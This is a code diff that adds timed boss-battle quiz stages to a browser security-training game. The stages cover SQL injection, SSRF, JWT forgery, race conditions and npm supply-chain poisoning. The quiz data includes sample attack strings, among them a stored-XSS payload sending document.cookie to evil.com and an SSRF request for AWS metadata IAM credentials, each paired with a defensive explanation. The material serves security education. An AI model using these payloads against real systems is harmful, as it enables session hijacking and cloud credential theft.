@@ -448,6 +448,26 @@ html,body{height:100%;overflow:hidden;background:#090C18;color:var(--txt);}
 #dragon-canvas{position:absolute;inset:0;width:100%;height:100%;}
 .dragon-text{position:absolute;top:42%;left:50%;transform:translate(-50%,-50%);font-family:'Uncial Antiqua',serif;font-size:clamp(2rem,5vw,3.2rem);color:#FF4400;text-shadow:0 0 30px rgba(255,100,0,.9),0 0 60px rgba(255,0,0,.5),0 0 100px rgba(255,0,0,.3);text-align:center;opacity:0;transition:opacity .5s;pointer-events:none;white-space:nowrap;}
 .dragon-text.show{opacity:1;}
+
+/* ── BOSS BATTLE ── */
+#bossHeader{display:none;background:linear-gradient(135deg,rgba(20,4,4,.96),rgba(12,3,16,.98));border:1px solid rgba(232,64,64,.35);border-radius:10px;padding:11px 14px;margin-bottom:12px;}
+.boss-hdr-main{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px;}
+.boss-name-col{display:flex;align-items:center;gap:10px;}
+.boss-icon-anim{font-size:2rem;filter:drop-shadow(0 0 14px rgba(232,64,64,.7));animation:float 2s ease-in-out infinite;display:block;}
+#bossNameEl{font-family:'Uncial Antiqua',serif;font-size:.95rem;color:#FF4444;text-shadow:0 0 16px rgba(232,64,64,.5);}
+#bossStageEl{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--muted);margin-top:2px;letter-spacing:.06em;}
+.boss-hp-col{display:flex;gap:14px;}
+.boss-hp-group{display:flex;align-items:center;gap:5px;}
+.boss-hp-lbl{font-family:'Cinzel',serif;font-size:.58rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;}
+.boss-heart{font-size:1rem;display:inline-block;transition:transform .35s cubic-bezier(.34,1.4,.64,1),opacity .35s;}
+.boss-heart.lost{transform:scale(0) rotate(30deg);opacity:0;}
+.boss-timer-row{display:flex;align-items:center;gap:9px;}
+.boss-timer-track{flex:1;height:8px;background:rgba(232,64,64,.12);border-radius:4px;overflow:hidden;border:1px solid rgba(232,64,64,.22);}
+#bossTimerFill{height:100%;width:100%;background:linear-gradient(90deg,#FF6060,#E84040);border-radius:4px;transition:width .12s linear;}
+#bossTimerFill.urgent{background:linear-gradient(90deg,#FF1010,#FF4040);animation:timerUrgent .45s ease-in-out infinite;}
+@keyframes timerUrgent{0%,100%{opacity:1}50%{opacity:.35}}
+#bossTimerNum{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:#FF4444;min-width:22px;text-align:right;}
+
 @keyframes screenShake{0%,100%{transform:translate(0,0)}20%{transform:translate(-8px,4px)}40%{transform:translate(8px,-4px)}60%{transform:translate(-5px,5px)}80%{transform:translate(5px,-3px)}}
 </style>
 </head>
@@ -742,7 +762,33 @@ html,body{height:100%;overflow:hidden;background:#090C18;color:var(--txt);}
   <div id="map-area">
     <canvas id="gc"></canvas>
     <div id="qpanel">
-      <div class="qp-hdr">
+      <!-- ── BOSS HEADER (hidden until boss fight) ── -->
+      <div id="bossHeader">
+        <div class="boss-hdr-main">
+          <div class="boss-name-col">
+            <span class="boss-icon-anim" id="bossIcon">🐉</span>
+            <div>
+              <div id="bossNameEl">THE SQL NECROMANCER</div>
+              <div id="bossStageEl">Stage 1 of 3</div>
+            </div>
+          </div>
+          <div class="boss-hp-col">
+            <div class="boss-hp-group">
+              <span class="boss-hp-lbl">Boss</span>
+              <span id="bossHeartsEl">❤️❤️❤️</span>
+            </div>
+            <div class="boss-hp-group">
+              <span class="boss-hp-lbl">You</span>
+              <span id="playerHeartsEl">🛡️🛡️🛡️</span>
+            </div>
+          </div>
+        </div>
+        <div class="boss-timer-row">
+          <div class="boss-timer-track"><div id="bossTimerFill"></div></div>
+          <span id="bossTimerNum">30</span>
+        </div>
+      </div>
+            <div class="qp-hdr">
         <div>
           <div class="qp-tag" id="qpTag">⚔️ Challenge</div>
           <div style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:3px;" id="qpSub"></div>
@@ -2256,6 +2302,15 @@ function onReachedWaypoint(){
     return;
   }
   charAction='idle';
+  // Boss stones: 5=SQL Necromancer, 10=Shadow Proxy, 15=Dragon of Broken Trust
+  var bossIdx = stoneIdx===5 ? 0 : stoneIdx===10 ? 1 : stoneIdx===15 ? 2 : -1;
+  if (bossIdx !== -1) {
+    var ch = CHALLENGES[stoneIdx-1];
+    if (ch && !state.completed.includes(ch.id)) {
+      triggerBossBattle(bossIdx);
+      return;
+    }
+  }
   openQuestion();
 }
 
@@ -3189,6 +3244,400 @@ function escHtml(s){
   if(!s) return '';
   return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
+
+
+// ═══════════════════════════════════════════════
+// BOSS BATTLE SYSTEM
+// ═══════════════════════════════════════════════
+var BOSS_DATA = [
+
+  // ── Boss 0: The SQL Necromancer (Stone 5, Paige) ────────────────────────
+  {
+    name:'THE SQL NECROMANCER', icon:'💀', color:'#9B30FF', glowColor:'rgba(155,48,255,.5)',
+    xpReward: 75,
+    intro:'From the depths of corrupted databases, the SQL Necromancer rises! His dark queries have enslaved the data of thousands...',
+    defeatMsg:'The Necromancer\'s dark queries consume you. Your data is corrupted.',
+    victoryMsg:'The SQL Necromancer\'s dark queries are purged! The Green Fields breathe free!',
+    stages:[
+      { title:'The Cursed Query',
+        body:'The Necromancer\'s opening spell. Which defense completely prevents SQL Injection at its root?',
+        code:'',
+        options:['Escaping special characters manually before inserting','Parameterized queries — data is never concatenated into SQL code','Validating that input contains no single quotes','Using stored procedure names with user input'],
+        correct:1,
+        explanation:'Parameterized queries separate code from data at the protocol level — the database never interprets user input as SQL. Manual escaping is error-prone and bypassable. Parameterized queries are the only true shield.'
+      },
+      { title:'The Blind Incantation',
+        body:'The Necromancer uses blind SQL injection — no errors, no visible output. Yet he extracts your passwords character by character. How?',
+        code:'-- If SLEEP(5) delays the response, the condition was TRUE\nSELECT * FROM users WHERE id=1 AND SLEEP(5)--',
+        options:['He cannot — no visible output means no data extraction','Using timing or boolean conditions: response delay/behavior reveals each character','By reading server log files directly via the query','Blind SQLi only works against MySQL databases'],
+        correct:1,
+        explanation:'Blind SQLi extracts data without visible output using time-based (SLEEP) or boolean techniques. The attacker measures response time — a delay means TRUE, no delay means FALSE — extracting one bit at a time. Parameterized queries defeat this too.'
+      },
+      { title:'The Phylactery Query',
+        body:'Second-order SQLi — the Necromancer\'s true form. Data stored safely becomes a weapon when re-used in another query. What destroys his phylactery?',
+        code:"-- Username safely stored: \"admin'--\"\n-- Later used WITHOUT parameterization:\nSELECT * FROM logs WHERE user = '" + "admin'--" + "'  -- breaks!",
+        options:['Sanitize input on the way in — stored data is always safe','Encode output when displaying to the browser','Use parameterized queries at EVERY database interaction — even when reading stored data into new queries','Stored procedures always prevent second-order injection'],
+        correct:2,
+        explanation:'Second-order injection stores malicious data that gets re-used in a later, vulnerable query. Defense: parameterized queries everywhere — not just on first input. Never trust data just because it came from your own database.'
+      }
+    ]
+  },
+
+  // ── Boss 1: The Shadow Proxy (Stone 10, Squire) ─────────────────────────
+  {
+    name:'THE SHADOW PROXY', icon:'👁️', color:'#00BB55', glowColor:'rgba(0,187,85,.5)',
+    xpReward: 100,
+    intro:'The Shadow Proxy lurks between every request and response — intercepting, forging, redirecting. Nothing you send reaches its true destination...',
+    defeatMsg:'The Shadow Proxy has intercepted your soul. Your session belongs to the darkness.',
+    victoryMsg:'The Shadow Proxy\'s veil is torn! The Dark Forest\'s communications are secure!',
+    stages:[
+      { title:'The Forged Identity',
+        body:'The Shadow Proxy adds X-Forwarded-For: 127.0.0.1 to a request. The server trusts it and grants admin access. What is the critical mistake?',
+        code:"// DANGEROUS — client controls this header:\nif (req.headers['x-forwarded-for'] === '127.0.0.1') {\n  grantAdminAccess(); // Any attacker can fake this!\n}",
+        options:['X-Forwarded-For is accurate — it comes from trusted proxies','Trusting client-controlled headers for security — any attacker can set any header value','The server should check X-Real-IP instead','This is only a risk on public-facing servers'],
+        correct:1,
+        explanation:'HTTP headers are fully client-controlled. X-Forwarded-For, X-Real-IP, and similar headers can be set to any value by any client. Never use them for authentication, authorization, or IP-based access control — only trust network-level verified identity.'
+      },
+      { title:'The Reflected Curse',
+        body:'The Shadow Proxy delivers a stored XSS payload executing in every visitor\'s browser. Which Content Security Policy defeats it?',
+        code:"// Stored XSS payload (attacker saved this in the database):\n<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">",
+        options:["Content-Security-Policy: default-src 'self'","Content-Security-Policy: script-src *","X-Frame-Options: SAMEORIGIN","Referrer-Policy: no-referrer"],
+        correct:0,
+        explanation:"CSP default-src 'self' blocks inline scripts AND scripts from external origins. The stored XSS payload — inline or loading from evil.com — is blocked by the browser before executing. X-Frame-Options protects against clickjacking, not XSS. HSTS enforces HTTPS but doesn't block scripts."
+      },
+      { title:'The Shadow Portal',
+        body:'The Shadow Proxy exploits SSRF — your server fetches http://169.254.169.254/latest/meta-data/. What is the catastrophic result on AWS?',
+        code:"// Attacker's SSRF payload:\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/\n// Your server faithfully fetches it and returns the result...",
+        options:["The app's own /health endpoint — no real risk","AWS Instance Metadata Service — exposes IAM role credentials granting full AWS account access","A localhost test page — only dev data exposed","The application database — read-only access at most"],
+        correct:1,
+        explanation:'The AWS IMDS at 169.254.169.254 exposes IAM credentials attached to the EC2 instance — an SSRF attack can retrieve keys with permissions to the entire AWS account. Mitigation: block private/link-local IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x) in all server-side URL fetchers.'
+      }
+    ]
+  },
+
+  // ── Boss 2: Dragon of Broken Trust (Stone 15, Knight) ───────────────────
+  {
+    name:'DRAGON OF BROKEN TRUST', icon:'🐉', color:'#E84040', glowColor:'rgba(232,64,64,.65)',
+    xpReward: 150,
+    intro:'Ancient. Primordial. The Dragon of Broken Trust corrupts authentication tokens, poisons supply chains, and exploits the very fabric of trust...',
+    defeatMsg:'The Dragon of Broken Trust devours your credentials. The Shadow Castle burns.',
+    victoryMsg:'The Dragon is vanquished! The realm\'s trust is restored! You are a true Security Knight!',
+    stages:[
+      { title:'The Unsigned Sigil',
+        body:'The Dragon presents a JWT with "alg":"none" and "role":"admin". The server accepts it. What is the only correct defense?',
+        code:'// Dragon\'s forged token header:\n{ "alg": "none", "typ": "JWT" }\n// Payload: { "role": "admin" } — no signature at all!',
+        options:['Verify the JWT expiry (exp) claim is valid','Reject tokens where the payload differs from the original','Explicitly reject "none" algorithm and hardcode the expected algorithm server-side — never trust alg from the token itself','Require tokens to be signed with RS256 only'],
+        correct:2,
+        explanation:'The alg:none attack exploits servers that trust the algorithm field FROM the token itself. Fix: pin your expected algorithm (e.g., HS256) in server code. Never allow the token to dictate how it should be verified. Libraries like jsonwebtoken have an "algorithms" allowlist option for exactly this.'
+      },
+      { title:'The Dragon\'s Double Strike',
+        body:'Two simultaneous requests both pass "balance >= 100?" before either deducts. The treasury goes negative. What is the correct database-level fix?',
+        code:'async function withdraw(userId, amount) {\n  const bal = await getBalance(userId); // Both read: 100\n  if (bal >= amount) {\n    await deduct(userId, amount);         // Both deduct!\n  }\n}',
+        options:['Add a short delay between the check and deduction','Check the balance twice in sequence before deducting','Use SELECT FOR UPDATE to lock the row, or an atomic UPDATE ... WHERE balance >= amount inside a transaction','Move the balance check to the client side'],
+        correct:2,
+        explanation:'TOCTOU race conditions require atomic database operations. SELECT FOR UPDATE locks the row — the second request blocks until the first commits. Alternatively: UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ? — if zero rows updated, funds were insufficient. Application-level delays still have race windows.'
+      },
+      { title:'The Poisoned Hoard',
+        body:'The Dragon poisoned an npm package (v1.2.4). Your app auto-updated and now runs malicious code. Which combination of defenses would have stopped this?',
+        code:'"dependencies": {\n  "dragon-utils": "^1.2.3"  // ^ allows auto-update to 1.2.4!\n}',
+        options:['Run npm audit weekly and update promptly','Only use packages with 1000+ GitHub stars','Pin exact versions in lockfiles (remove ^), verify integrity checksums, use SCA tools like Snyk or Socket to detect malicious packages, review changelogs before upgrading','Enable 2FA on your npm account'],
+        correct:2,
+        explanation:'Supply chain defense requires layers: remove ^ to pin exact versions (prevents auto-update to the poisoned version), use npm ci in CI to enforce the lockfile, verify package provenance, and use SCA tools like Socket that detect behavioral anomalies in NEW package versions — not just known CVEs.'
+      }
+    ]
+  }
+];
+
+var bossState   = null;
+var bossTimerIv = null;
+
+function triggerBossBattle(bossIdx) {
+  var boss = BOSS_DATA[bossIdx];
+  gameState = 'BOSS';
+  charAction = 'idle';
+
+  // Boss-specific dragon entrance text
+  document.getElementById('dragon-text').innerHTML =
+    boss.icon + ' ' + boss.name + '<br>' +
+    '<span style="font-size:45%;color:#FF8844;font-family:\'Cinzel\',serif;white-space:normal;max-width:80vw;display:inline-block;">' +
+    boss.intro.substring(0, 70) + '...</span>';
+
+  dragonAnim.show();
+
+  // After entrance animation, start the fight
+  setTimeout(function() {
+    // Restore dragon text default
+    document.getElementById('dragon-text').innerHTML =
+      '🐉 The Dragon Strikes!<br>' +
+      '<span style="font-size:55%;color:#FF8844;font-family:\'Cinzel\',serif">Study the explanation and continue your quest!</span>';
+    initBossFight(bossIdx);
+  }, 2800);
+}
+
+function initBossFight(bossIdx) {
+  var boss = BOSS_DATA[bossIdx];
+  bossState = { bossIdx:bossIdx, stage:0, bossHP:3, playerHP:3, answered:false, timeLeft:30, shuffledOpts:[], shuffledCorrect:0 };
+
+  // Style boss header
+  var icon = document.getElementById('bossIcon');
+  icon.textContent = boss.icon;
+  icon.style.filter = 'drop-shadow(0 0 16px ' + boss.glowColor + ')';
+  document.getElementById('bossNameEl').textContent  = boss.name;
+  document.getElementById('bossNameEl').style.color  = boss.color;
+  document.getElementById('bossNameEl').style.textShadow = '0 0 20px ' + boss.glowColor;
+  document.getElementById('bossHeader').style.display = 'block';
+  document.getElementById('bossHeader').style.borderColor = boss.color.replace(')', ',.4)').replace('rgb', 'rgba');
+  document.getElementById('qpanel').style.borderTopColor = boss.color;
+  document.getElementById('qpanel').style.boxShadow = '0 -8px 50px ' + boss.glowColor;
+
+  addWizMsg('wiz', boss.icon + ' <strong>' + boss.name + ' attacks!</strong><br><em>' + boss.intro + '</em>');
+  loadBossStage();
+}
+
+function loadBossStage() {
+  if (!bossState) return;
+  var boss  = BOSS_DATA[bossState.bossIdx];
+  var stage = boss.stages[bossState.stage];
+
+  document.getElementById('bossStageEl').textContent = 'Stage ' + (bossState.stage+1) + ' of 3';
+  updateBossHP();
+
+  // Shuffle options
+  var opts = stage.options.map(function(o,i){return{text:o,idx:i};});
+  for(var i=opts.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=opts[i];opts[i]=opts[j];opts[j]=t;}
+  bossState.shuffledOpts    = opts;
+  bossState.shuffledCorrect = opts.findIndex(function(o){return o.idx===stage.correct;});
+  bossState.answered = false;
+
+  // Render into existing qpanel elements
+  var tag = document.getElementById('qpTag');
+  tag.textContent   = boss.icon + ' BOSS · Stage ' + (bossState.stage+1);
+  tag.style.color   = boss.color;
+  tag.style.borderColor = boss.color;
+  document.getElementById('qpSub').textContent   = 'Defeat ' + boss.name + ' — 3 stages, 30 seconds each';
+  document.getElementById('qpXp').textContent    = '🏆 +' + boss.xpReward + ' Boss XP';
+  document.getElementById('qpXp').style.borderColor = boss.color;
+  document.getElementById('qpTitle').textContent = stage.title;
+  document.getElementById('qpBody').textContent  = stage.body;
+  var codeEl = document.getElementById('qpCode');
+  if(stage.code){codeEl.style.display='block';codeEl.textContent=stage.code;}
+  else{codeEl.style.display='none';}
+
+  var optsEl = document.getElementById('qpOpts');
+  optsEl.innerHTML = '';
+  var letters = ['A','B','C','D'];
+  opts.forEach(function(o,i){
+    var btn=document.createElement('button'); btn.type='button'; btn.className='opt'; btn.id='bossOpt'+i;
+    (function(idx){btn.addEventListener('click',function(){pickBossAnswer(idx);});})(i);
+    var badge=document.createElement('span'); badge.className='oltr'; badge.textContent=letters[i];
+    var txt=document.createElement('span'); txt.textContent=o.text;
+    btn.appendChild(badge); btn.appendChild(txt); optsEl.appendChild(btn);
+  });
+
+  document.getElementById('qpExpl').className = 'expl';
+  document.getElementById('qpExpl').textContent = '';
+  document.getElementById('nxtBtn').className = 'nxt'; // hide until answered
+
+  gameState = 'BOSS';
+  setTimeout(function(){document.getElementById('qpanel').classList.add('open');}, 150);
+  startBossTimer();
+}
+
+function startBossTimer() {
+  if (bossTimerIv) { clearInterval(bossTimerIv); bossTimerIv = null; }
+  bossState.timeLeft = 30;
+  updateBossTimer();
+  bossTimerIv = setInterval(function() {
+    if (!bossState || bossState.answered) return;
+    bossState.timeLeft -= 0.12;
+    updateBossTimer();
+    if (bossState.timeLeft <= 0) {
+      clearInterval(bossTimerIv); bossTimerIv = null;
+      addWizMsg('wiz', '⏱️ <strong>Time\'s up!</strong> The ' + BOSS_DATA[bossState.bossIdx].name + ' strikes!');
+      bossPlayerHit(true);
+    }
+  }, 120);
+}
+
+function updateBossTimer() {
+  if (!bossState) return;
+  var pct = Math.max(0, (bossState.timeLeft / 30) * 100);
+  var fill = document.getElementById('bossTimerFill');
+  var num  = document.getElementById('bossTimerNum');
+  if (fill) { fill.style.width = pct + '%'; fill.className = bossState.timeLeft <= 8 ? 'urgent' : ''; }
+  if (num)  { num.textContent = Math.ceil(Math.max(0, bossState.timeLeft)); }
+}
+
+function updateBossHP() {
+  if (!bossState) return;
+  var bh = document.getElementById('bossHeartsEl');
+  var ph = document.getElementById('playerHeartsEl');
+  if (!bh || !ph) return;
+  bh.innerHTML = ''; ph.innerHTML = '';
+  for (var i=0;i<3;i++){
+    var s=document.createElement('span'); s.className='boss-heart'+(i>=bossState.bossHP?' lost':''); s.textContent='❤️'; bh.appendChild(s);
+  }
+  for (var i=0;i<3;i++){
+    var s=document.createElement('span'); s.className='boss-heart'+(i>=bossState.playerHP?' lost':''); s.textContent='🛡️'; ph.appendChild(s);
+  }
+}
+
+function pickBossAnswer(idx) {
+  if (!bossState || bossState.answered) return;
+  bossState.answered = true;
+  if (bossTimerIv) { clearInterval(bossTimerIv); bossTimerIv = null; }
+
+  var isCorrect = idx === bossState.shuffledCorrect;
+  var boss  = BOSS_DATA[bossState.bossIdx];
+  var stage = boss.stages[bossState.stage];
+
+  // Style options
+  for (var i=0;i<4;i++){
+    var btn=document.getElementById('bossOpt'+i); if(!btn) continue;
+    btn.disabled=true;
+    if(i===bossState.shuffledCorrect) btn.classList.add('correct');
+    else if(i===idx&&!isCorrect) btn.classList.add('wrong');
+  }
+
+  var expl=document.getElementById('qpExpl');
+  expl.textContent=stage.explanation;
+  expl.className='expl show '+(isCorrect?'ck':'wk');
+
+  if (isCorrect) {
+    bossState.bossHP--;
+    updateBossHP();
+    burst(window.innerWidth*.5, window.innerHeight*.55, '#E8A820');
+    
+    if (bossState.bossHP <= 0) {
+      addWizMsg('wiz', '⚔️ <strong>Final blow!</strong> The ' + boss.name + ' falls!');
+      setTimeout(bossVictory, 1400);
+    } else {
+      addWizMsg('wiz', '⚔️ <strong>Hit!</strong> ' + boss.name + ' has ' + bossState.bossHP + ' HP left. Press on!');
+      bossState.stage++;
+      var nxt=document.getElementById('nxtBtn');
+      nxt.className='nxt show';
+      nxt.style.background='linear-gradient(135deg,#8B0000,#E84040)';
+      nxt.textContent='⚔️ Press On → Stage '+(bossState.stage+1)+' of 3';
+      nxt.onclick=function(){
+        nxt.style.background=''; nxt.className='nxt'; nxt.textContent='Continue Quest →'; nxt.onclick=onNext;
+        document.getElementById('qpanel').classList.remove('open');
+        setTimeout(loadBossStage, 400);
+      };
+    }
+  } else {
+    bossPlayerHit(false);
+  }
+}
+
+function bossPlayerHit(timedOut) {
+  if (!bossState) return;
+  bossState.playerHP--;
+  updateBossHP();
+  showDragonAttack();
+
+  var boss  = BOSS_DATA[bossState.bossIdx];
+  var stage = boss.stages[bossState.stage];
+
+  // Show explanation on wrong answer/timeout
+  var expl = document.getElementById('qpExpl');
+  if (!timedOut) { expl.textContent = stage.explanation; expl.className = 'expl show wk'; }
+
+  // Mark correct option visually when timed out
+  if (timedOut) {
+    for (var i=0;i<4;i++){
+      var btn=document.getElementById('bossOpt'+i); if(!btn) continue;
+      btn.disabled=true;
+      if(i===bossState.shuffledCorrect) btn.classList.add('correct');
+    }
+    expl.textContent = stage.explanation; expl.className = 'expl show wk';
+  }
+
+  if (bossState.playerHP <= 0) {
+    addWizMsg('wiz', '💀 <strong>'+boss.name+' wins this battle!</strong> '+boss.defeatMsg);
+    setTimeout(bossDeath, 2500);
+  } else {
+    addWizMsg('wiz', '⚠️ <strong>The '+boss.name+' strikes!</strong> You have '+bossState.playerHP+' shield'+(bossState.playerHP===1?'':'s')+' left. Study the explanation!');
+    var nxt=document.getElementById('nxtBtn');
+    nxt.className='nxt show';
+    nxt.style.background='linear-gradient(135deg,#400000,#C03030)';
+    nxt.textContent='🛡️ Fight On →';
+    nxt.onclick=function(){
+      nxt.style.background=''; nxt.className='nxt'; nxt.textContent='Continue Quest →'; nxt.onclick=onNext;
+      document.getElementById('qpanel').classList.remove('open');
+      setTimeout(function(){ bossState.answered=false; loadBossStage(); }, 400);
+    };
+  }
+}
+
+function bossVictory() {
+  if (!bossState) return;
+  var boss   = BOSS_DATA[bossState.bossIdx];
+  var xp     = boss.xpReward;
+  var bossId = bossState.bossIdx;
+
+  bossClearUI();
+
+  state.xp += xp;
+  var ch = CHALLENGES[stoneIdx-1];
+  if (ch && !state.completed.includes(ch.id)) state.completed.push(ch.id);
+  checkRankUp(state.xp - xp);
+  saveState(); updateHUD(); renderSidebar();
+
+  // Triple burst
+  for (var b=0;b<4;b++){ (function(d){setTimeout(function(){ burst(window.innerWidth*.5,window.innerHeight*.45,'#FFD700'); },d);})(b*200); }
+  
+  Music.changeZone(state.rank); // zone may have changed after XP
+
+  var ov=document.createElement('div'); ov.className='overlay';
+  ov.innerHTML='<div class="mcard" style="text-align:center;border-color:'+boss.color+';box-shadow:0 0 80px '+boss.glowColor+'">' +
+    '<span style="font-size:4rem;display:block;margin-bottom:12px">'+boss.icon+'💥</span>'+
+    '<h2 style="font-family:\'Uncial Antiqua\',serif;font-size:1.3rem">'+boss.name+'<br>DEFEATED!</h2>'+
+    '<p style="color:#FFD700;margin:10px 0;font-size:.9rem">'+boss.victoryMsg+'</p>'+
+    '<p style="font-family:\'JetBrains Mono\',monospace;font-size:.72rem;color:var(--muted);margin-bottom:4px">+'+xp+' XP · Boss Cleared!</p>'+
+    '<div style="display:flex;gap:8px;margin-top:18px">'+
+    '<button class="bgold" style="flex:1" onclick="this.closest(\'.overlay\').remove();setTimeout(walkToNextStone,300)">Continue Quest →</button>'+
+    '</div></div>';
+  document.body.appendChild(ov);
+  addWizMsg('wiz','🏆 <strong>BOSS DEFEATED!</strong> +'+xp+' XP! '+boss.victoryMsg);
+  gameState='WALKING'; bossState=null;
+}
+
+function bossDeath() {
+  if (!bossState) return;
+  var boss   = BOSS_DATA[bossState.bossIdx];
+  var bossId = bossState.bossIdx;
+
+  bossClearUI();
+  document.getElementById('dragon-overlay').classList.remove('active');
+
+  var ov=document.createElement('div'); ov.className='overlay';
+  ov.innerHTML='<div class="mcard" style="text-align:center;border-color:rgba(232,64,64,.5)">'+
+    '<span style="font-size:3.5rem;display:block;margin-bottom:14px">'+boss.icon+'💀</span>'+
+    '<h2 style="background:linear-gradient(135deg,#E84040,#FF6060);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">Defeated by '+boss.name+'</h2>'+
+    '<p style="margin:8px 0">'+boss.defeatMsg+'</p>'+
+    '<p style="font-family:JetBrains Mono,monospace;font-size:.72rem;color:#7A8BAA;margin-top:6px">Study the explanations — the realm needs a stronger knight.</p>'+
+    '<div style="display:flex;gap:8px;margin-top:18px">'+
+    '<button class="bgold" style="flex:1" id="bossRetryBtn">⚔️ Retry Boss</button>'+
+    '<button class="bghost" onclick="resetGame()">↺ Full Reset</button>'+
+    '</div></div>';
+  document.body.appendChild(ov);
+  document.getElementById('bossRetryBtn').onclick = function() {
+    ov.remove(); bossState=null; gameState='WALKING'; triggerBossBattle(bossId);
+  };
+  addWizMsg('wiz','⚠️ <strong>Defeated!</strong> '+boss.defeatMsg+' You may retry!');
+  gameState='WALKING'; bossState=null;
+}
+
+function bossClearUI() {
+  if (bossTimerIv) { clearInterval(bossTimerIv); bossTimerIv=null; }
+  document.getElementById('qpanel').classList.remove('open');
+  document.getElementById('bossHeader').style.display='none';
+  document.getElementById('qpanel').style.borderTopColor='';
+  document.getElementById('qpanel').style.boxShadow='';
+  var nxt=document.getElementById('nxtBtn');
+  nxt.style.background=''; nxt.className='nxt'; nxt.textContent='Continue Quest →'; nxt.onclick=onNext;
+}
+
 
 // ═══════════════════════════════════════════════
 // MODAL & INIT
